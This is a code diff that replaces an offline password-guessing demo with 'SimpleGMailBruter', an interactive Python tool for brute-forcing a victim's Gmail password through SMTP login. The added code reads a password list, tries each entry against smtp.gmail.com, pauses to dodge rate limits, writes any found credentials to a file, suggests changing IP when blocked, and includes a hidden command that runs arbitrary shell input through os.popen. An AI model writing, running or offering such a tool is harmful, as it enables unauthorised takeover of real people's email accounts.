@@ -1,92 +1,148 @@
-"""
-Password brute-force algorithm.
+import smtplib , os , sys , time
 
-List of most probable passwords and english names can be found, respectively, at:
-- https://github.com/danielmiessler/SecLists/blob/master/Passwords/probable-v2-top12000.txt
-- https://github.com/dominictarr/random-name/blob/master/middle-names.txt
+Count = 0
+_Count = 0
 
-Author: Raphael Vallat
-Date: May 2018
-Python 3
-"""
-import string
-from itertools import product
-from time import time
-from numpy import loadtxt
+def Banner():
+	Ban = "\n\t\t\t[>] SimpleGMailBruter [<]\n"; print(Ban)
 
+def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
+	with open('{0}'.format(Passlist),'r') as PasswordsFile:
+		for Password in PasswordsFile:
+			Password = Password.rstrip("\n")
+			try:
+				SMTPServer.login(account,Password)
+				print("[+] Valid Password Has Been Found: {0}, For: {1}".format(Password,account))
+				
+				# Create Data File!
+				with open('credits.txt' , 'a') as DataFile:
+					DataFile.write("\n--------------------------------------->"); DataFile.write("[+] Email: {0}\n".format(account)); DataFile.write("[+] Password: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
+				exit()
+			except smtplib.SMTPAuthenticationError:
+				Count += 1; _Count += 1
+				if Count == 20:
+					print("\n[!] Sleeping For {0} Seconds.".format(str(Time))); time.sleep(int(Time)); Count = 0
+					SMTPServer.close()
 
-def product_loop(password, generator):
-    for p in generator:
-        if ''.join(p) == password:
-            print('\nPassword:', ''.join(p))
-            return ''.join(p)
-    return False
+					SMTPServer = StartSMTPServiceForGmail()
+				else:
+					print("\rBad Password: {0}".format(Password + "   ") , end="")
+					sys.stdout.flush()
+			except Exception as e:
+				if "please run connect() first" in str(e):
+					SMTPServer.close()
+					print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime"); exit()
+				else:
+					print("Error: " + str(e))
 
+def StartSMTPServiceForGmail():
+	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
+	SMTPServer.ehlo()
+	SMTPServer.starttls()
+	return SMTPServer
 
-def bruteforce(password, max_nchar=8):
-    """Password brute-force algorithm.
+def HelpGuide():
+	print("\nHelp Guide For GmailBruterV2.")
+	print("Commands For Shell:")
+	print("\thelp   --   To Show This Messages")
+	print("\tset target   --   To Set The Victim Email Address")
+	print("\tset time   --   To Set Time Between Every 10 Faild Passwords")
+	print("\tset list   --   To Set PassList Name ")
+	print("\tshow target   --   To Show You Current Target ")
+	print("\tshow time   --   To Show You Current Time ")
+	print("\tshow list   --   To Show You Current List ")
+	print("\tload   --   Load Local Config For Settings")
+	print("\tstart   --   To Start Brute Force Attack\n")
+	print("\texit   --   Close The Shell")
 
-    Parameters
-    ----------
-    password : string
-        To-be-found password.
-    max_nchar : int
-        Maximum number of characters of password.
+def ContactMe():
+	Gmail =  "mdaif1332@gmail.com" # Don't perform the brute-force attacks on my email.
 
-    Return
-    ------
-    bruteforce_password : string
-        Brute-forced password
-    """
-    print('1) Comparing with most common passwords / first names')
-    common_pass = loadtxt('probable-v2-top12000.txt', dtype=str)
-    common_names = loadtxt('middle-names.txt', dtype=str)
-    cp = [c for c in common_pass if c == password]
-    cn = [c for c in common_names if c == password]
-    cnl = [c.lower() for c in common_names if c.lower() == password]
+def StartShell():
+	Commands = []
+	Account = ''
+	Time = ''
+	PassList = ''
+	with open(os.path.join("data" , "Commands") ,'r') as CommandsFile:
+		for Command in CommandsFile:
+			Command = Command.rstrip("\n")
+			Commands.append(Command)
+	while True:
+		ShellResponse = input("root@GmailBruter: ")
+		if ShellResponse.lower().replace(' ' , '') not in Commands:
+			if "s-" in ShellResponse.lower():
+				Command = ShellResponse.split("-"); Command = Command[1]
+				Results = os.popen(Command).read()
+				print("Command:" + Command)
+				print("Results: \n{0}".format(Results))
+			else:
+				print("Can't find the command: '{0}'".format(ShellResponse))
+		elif ShellResponse.lower() == "help":
+			HelpGuide()
+		elif ShellResponse.lower().replace(' ' , '') == "settarget":
+			Account = input("Target: ")
+		elif ShellResponse.lower().replace(' ' , '') == "settime":
+			Time = input("Time: ")
+		elif ShellResponse.lower().replace(' ' , '') == "setlist":
+			PassList = input("List: ")
+		elif ShellResponse.lower().replace(' ' , '') == "showtarget":
+			if Account == '':
+				print("[-] There's no target on the settings")
+			else:
+				print("Target: " + Account)
+		elif ShellResponse.lower().replace(' ' , '') == "showtime":
+			if Time == '':
+				print("[-] There's no time has been set")
+			else:
+				print("Time: " + Time)
+		elif ShellResponse.lower().replace(' ' , '') == "showlist":
+			if PassList == '':
+				print("[-] You didn't select a list")
+			else:
+				print("List: " + PassList)
+		elif ShellResponse.lower() == "start":
+			StartSMTPServiceForGmail()
+			Service = StartSMTPServiceForGmail()
+			if Account == '':
+				print("[!] Set Target!")
+				break
+			elif PassList == '':
+				print("[!] Set List!")
+				break
+			elif Time == '':
+				print("[!] Set Time!")
+				break
+			else:
+				StartBruteAccount(PassList,Account,Service,Count,_Count,Time)
+		elif ShellResponse.lower() == "exit":
+			exit()
+		elif ShellResponse.lower() == "load":
+			Config = input("Path: ")
+			if os.path.exists(Config):
+				Settings = open(Config , 'r')
 
-    if len(cp) == 1:
-        print('\nPassword:', cp)
-        return cp
-    if len(cn) == 1:
-        print('\nPassword:', cn)
-        return cn
-    if len(cnl) == 1:
-        print('\nPassword:', cnl)
-        return cnl
+				for Line in Settings:
+					Line = Line.rstrip("\n"); Options = Line.split(":")
 
-    print('2) Digits cartesian product')
-    for l in range(1, 9):
-        generator = product(string.digits, repeat=int(l))
-        print("\t..%d digit" % l)
-        p = product_loop(password, generator)
-        if p is not False:
-            return p
+					try:
+						if Options[0] == "email":
+							Account = Options[1]
+							print("Target: {0}".format(Options[1]))
+						elif Options[0] == "list":
+							PassList = Options[1]
+							print("List: {0}".format(PassList))
+						elif Options[0] == "time":
+							Time = Options[1]
+							print("Time: {0}".format(Time))
+						else:
+							print("[-] Invalid Config. Please check it again.")
+					except Exception:
+						print("[-] Invalid Config. Please check it again.")
+			else:
+				print("[-] The config file you selected doesn't exists")
+		else:
+			pass
 
-    print('3) Digits + ASCII lowercase')
-    for l in range(1, max_nchar + 1):
-        print("\t..%d char" % l)
-        generator = product(string.digits + string.ascii_lowercase,
-                            repeat=int(l))
-        p = product_loop(password, generator)
-        if p is not False:
-            return p
-
-    print('4) Digits + ASCII lower / upper + punctuation')
-    # If it fails, we start brute-forcing the 'hard' way
-    # Same as possible_char = string.printable[:-5]
-    all_char = string.digits + string.ascii_letters + string.punctuation
-
-    for l in range(1, max_nchar + 1):
-        print("\t..%d char" % l)
-        generator = product(all_char, repeat=int(l))
-        p = product_loop(password, generator)
-        if p is not False:
-            return p
-
-
-# EXAMPLE
-start = time()
-bruteforce('sunshine') # Try with '123456' or '751345' or 'test2018'
-end = time()
-print('Total time: %.2f seconds' % (end - start))
+# Start
+Banner()
+StartShell()
